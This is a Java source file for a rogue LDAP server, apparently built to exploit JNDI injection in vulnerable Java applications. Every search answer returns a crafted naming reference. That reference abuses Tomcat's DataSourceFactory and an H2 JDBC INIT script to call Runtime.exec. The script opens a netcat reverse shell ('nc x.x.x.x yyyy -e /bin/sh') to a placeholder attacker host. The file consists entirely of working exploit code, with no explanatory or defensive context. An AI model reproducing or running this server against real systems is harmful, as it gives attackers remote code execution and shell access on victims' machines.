package org.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class Main {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main(String[] args) {
        int port = 1389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                System.out.println("Send LDAP reference");
                entry.addAttribute("objectClass", "javaNamingReference");

                String url = "jdbc:h2:mem:memdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                        "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                        "CALL EXEC ('nc x.x.x.x yyyy -e /bin/sh')\\;";

                Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
                ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
                ref.add(new StringRefAddr("url", url));
                ref.add(new StringRefAddr("initialSize", "1"));
                ref.add(new StringRefAddr("username", "sa"));
                encodeReference('#', ref, entry);

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }


        private void encodeReference(char separator, Reference ref, Entry attrs) {

            String s;

            if ((s = ref.getClassName()) != null) {
                attrs.addAttribute("javaClassName", s);
            }

            if ((s = ref.getFactoryClassName()) != null) {
                attrs.addAttribute("javaFactory", s);
            }

            if ((s = ref.getFactoryClassLocation()) != null) {
                attrs.addAttribute("javaCodeBase", s);
            }

            int count = ref.size();

            if (count > 0) {
                String refAttr = "";
                RefAddr refAddr;

                for (int i = 0; i < count; i++) {
                    refAddr = ref.get(i);

                    if (refAddr instanceof StringRefAddr) {
                        refAttr = ("" + separator + i +
                                separator + refAddr.getType() +
                                separator + refAddr.getContent());
                    }
                    attrs.addAttribute("javaReferenceAddress", refAttr);
                }

            }
        }

    }
}